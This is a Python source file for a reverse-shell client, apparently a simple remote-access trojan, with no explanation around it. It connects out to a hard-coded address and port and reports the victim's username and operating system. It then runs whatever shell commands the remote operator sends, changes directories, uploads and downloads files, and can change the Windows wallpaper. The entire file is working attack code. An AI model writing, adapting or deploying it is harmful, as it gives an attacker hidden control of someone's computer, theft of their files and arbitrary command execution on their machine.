from getpass import getuser
import os
from socket import *
from sqlite3 import connect
import subprocess
import platform
import ctypes
from time import sleep

get_os = platform.uname()[0]
get_user = getuser()
os_info = "client_name : "+str(get_user)+" <-> "+"client_os : "+str(get_os)

ip = "192.168.1.101"
port = 1234
connection = socket(AF_INET, SOCK_STREAM)
connection.connect((ip, port))

connection.send(os_info.encode())

while True:
    recever = connection.recv(1024).decode()

    if recever == "exit":
        exit()
    elif recever[:2] == "cd":
        os.chdir(recever[3:])
        connection.send(os.getcwd().encode())
    elif recever == "chback":
        ctypes.windll.user32.SystemParametersInfoW(20, 0, r"D:\\wallpaper\\as.jpg")

    elif recever[:4] == "down":
        file = recever[5:]
        file = open(file, "rb")
        data = file.read()
        file.close()

        while True:
            if len(data)>0:
                temp_data = data[:1024]
                if len(temp_data) < 1024:
                    temp_data += chr(0).encode() * (1024 - len(temp_data))

                data = data[1024:]

                connection.send(temp_data)
            else:
                connection.send("Ended".encode())
                sleep(0.5)
                break
        connection.send(" Download True :)".encode())

    elif recever[:2] == "up":
        cmd_list = recever.split(" ")

        data = b""
        while True:
            end_data = connection.recv(1024)

            if end_data == b"Ended":
                break
            data += end_data
        new_file = open(cmd_list[2], "wb")
        new_file.write(data)
        new_file.close()

        connection.send(" Upload True :)".encode())

    else:
        out_put = subprocess.getoutput(recever)

        if out_put == "" or out_put == None:
            out_put = "error"
            connection.send(out_put.encode())
        else:
            connection.send(out_put.encode())